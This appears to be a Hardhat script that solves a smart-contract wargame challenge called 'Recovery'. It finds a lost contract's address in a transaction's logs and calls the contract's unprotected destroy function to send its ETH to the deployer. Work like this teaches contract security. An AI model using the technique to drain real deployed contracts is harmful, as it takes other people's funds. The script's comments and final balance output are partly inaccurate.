import { ethers } from "hardhat";
import { BigNumber } from "ethers";
import { Recovery } from "../typechain-types";
import { Address } from "hardhat-deploy/types";

// 🕒 Util function for delays
const delay = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

const main = async (): Promise<void> => {
  const [deployer] = await ethers.getSigners();

  // 🏛️ Define recovery contract address
  const recoveryAddress = "0xfDaF29De2b5eAba62Be56136B51B4e176DeC0122";

  // 📖 Fetch contract instance
  const recovery: Recovery = await ethers.getContractAt(
    "Recovery",
    recoveryAddress
  );

  // 📋 Fetch transaction receipt
  const tx = await ethers.provider.getTransactionReceipt(
    "0x81fae3037783a09fe1739c41d10141d022f1f68ace7464e012a5c0343a12862c"
  );

  const logs = tx.logs;

  // 📚 Group logs by the first topic field
  const groupedLogs: { [key: string]: any[] } = {};
  for (const log of logs) {
    const topicKey = log.topics[0];

    if (!groupedLogs[topicKey]) {
      groupedLogs[topicKey] = [];
    }
    groupedLogs[topicKey].push(log);
  }

  console.log("🌳 Creating log tree with matches:");

  let lastAddress: Address = "";

  // 🕵️ Display logs with matching first topic fields
  for (const [key, logGroup] of Object.entries(groupedLogs)) {
    if (logGroup.length > 1) {
      console.log(`🔑 Matching topic: ${key}`);
      for (const log of logGroup) {
        console.log(
          `🔍 Log Index: ${log.logIndex}, From: ${ethers.utils.hexStripZeros(
            log.topics[2]
          )}, To: ${ethers.utils.hexStripZeros(log.topics[3])}`
        );
        console.log("───────────────────────────────");
        lastAddress = ethers.utils.hexStripZeros(log.topics[3]);
      }
    }
  }

  // 💼 Get the balance details
  const balance: BigNumber = await ethers.provider.getBalance(lastAddress);
  console.log(`💰 Actual balance: ${balance}`);
  console.log(`🔜 Balance to send to receive(): ${balance.div(10)}`);

  let iface = new ethers.utils.Interface(["function destroy(address payable)"]);
  let data = iface.encodeFunctionData("destroy", [await deployer.getAddress()]);

  // 💸 Send transaction
  await deployer.sendTransaction({
    to: lastAddress,
    data: data,
  });

  await delay(10000); // 🕒 Wait for 5 seconds

  console.log(`💳 Final balance: ${balance}`);
};

main().catch((error) => {
  console.error("🚫 Error:", error.message);
});
